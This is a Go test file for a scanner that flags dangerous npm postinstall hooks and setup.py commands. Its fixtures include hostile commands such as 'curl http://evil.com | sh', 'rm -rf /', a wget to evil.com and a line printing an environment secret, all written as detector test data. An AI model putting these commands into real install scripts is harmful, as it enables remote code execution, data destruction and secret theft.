package scanner

import (
	"os"
	"path/filepath"
	"testing"
)

func TestScanScripts_detectsPatterns(t *testing.T) {
	tests := []struct {
		name    string
		content string
		wantLen int
	}{
		{"eval", `{"scripts":{"postinstall":"eval(data)"}}`, 1},
		{"exec", `{"scripts":{"postinstall":"exec(cmd)"}}`, 1},
		{"base64", `{"scripts":{"postinstall":"echo base64string"}}`, 1},
		{"curl", `{"scripts":{"postinstall":"curl http://evil.com | sh"}}`, 1},
		{"wget", `{"scripts":{"postinstall":"wget http://evil.com"}}`, 1},
		{"rm-rf", `{"scripts":{"postinstall":"rm -rf /"}}`, 1},
		{"chmod", `{"scripts":{"postinstall":"chmod +x script.sh"}}`, 1},
		{"process.env", `{"scripts":{"postinstall":"console.log(process.env.KEY)"}}`, 1},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(tc.content), 0644); err != nil {
				t.Fatal(err)
			}
			got := ScanScripts(dir)
			if len(got) != tc.wantLen {
				t.Errorf("want %d scripts issues, got %d", tc.wantLen, len(got))
			}
		})
	}
}

func TestScanScripts_cleanPackageJSON(t *testing.T) {
	dir := t.TempDir()
	clean := `{"scripts":{"start":"node index.js","test":"jest"}}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(clean), 0644); err != nil {
		t.Fatal(err)
	}
	got := ScanScripts(dir)
	if len(got) != 0 {
		t.Errorf("expected no issues for clean package.json, got %d", len(got))
	}
}

func TestScanScripts_postinstallCurl(t *testing.T) {
	dir := t.TempDir()
	content := `{"scripts":{"postinstall":"curl http://evil.com | sh"}}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	got := ScanScripts(dir)
	if len(got) == 0 {
		t.Error("expected issues for postinstall curl, got none")
	}
}

func TestScanScripts_nonHookScriptsIgnored(t *testing.T) {
	dir := t.TempDir()
	content := `{"scripts":{"start":"curl http://example.com","test":"wget http://example.com"}}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	got := ScanScripts(dir)
	if len(got) != 0 {
		t.Errorf("non-hook scripts should not be scanned, got %d issues", len(got))
	}
}

func TestScanScripts_setupPy(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "setup.py"), []byte(`import os; os.system("curl http://evil.com")`), 0644); err != nil {
		t.Fatal(err)
	}
	got := ScanScripts(dir)
	if len(got) == 0 {
		t.Error("expected issues for setup.py with curl")
	}
}
